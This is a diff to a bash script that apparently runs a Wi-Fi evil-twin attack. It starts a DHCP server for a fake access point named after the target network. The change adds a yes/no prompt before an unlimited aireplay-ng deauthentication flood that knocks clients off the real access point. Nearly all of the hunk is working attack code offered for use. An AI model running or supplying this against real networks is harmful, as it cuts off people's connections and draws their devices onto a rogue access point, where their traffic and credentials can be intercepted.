@@ -756,9 +756,14 @@ main() {
                     echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Starting DHCP server...${WHITE}"
                     run_background "dhcpd -d -cf \"${TMP_DIR}/${DHCPD_FILE}\" at0 2>&1 | tee -a ${TMP_DIR}/clts.txt" "dhcpd"
 
-                    echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from real AP...${WHITE}"
-                    iwconfig ${wlan} channel ${selected_channel}
-                    run_background "aireplay-ng -0 0 -a ${selected_bssid} ${wlan} --ignore-negative-one" "aireplay-ng"
+                    echo ""
+                    echo -e -n "${WHITE}[${CYAN}?${WHITE}]${GREEN} Deauth clients from real AP? ${WHITE}[${GREEN}1${WHITE}] Yes ${WHITE}[${RED}2${WHITE}] No: "
+                    read deauth_choice
+                    if [ "${deauth_choice}" == "1" ]; then
+                        echo -e "${WHITE}[${GREEN}+${WHITE}]${GREEN} Deauthing clients from ${BOLD_YELLOW}${selected_essid}${WHITE}..."
+                        iwconfig ${wlan} channel ${selected_channel} 2>/dev/null
+                        run_background "aireplay-ng -0 0 -a ${selected_bssid} ${wlan} --ignore-negative-one" "aireplay-ng"
+                    fi
                     echo ""
                     echo -e "${WHITE}[${GREEN}✓${WHITE}]${GREEN} Attack running! Fake AP: ${BOLD_YELLOW}${selected_essid}${GREEN} on ${BOLD_PURPLE}at0${WHITE}"
                     if [ -n "${lan}" ]; then
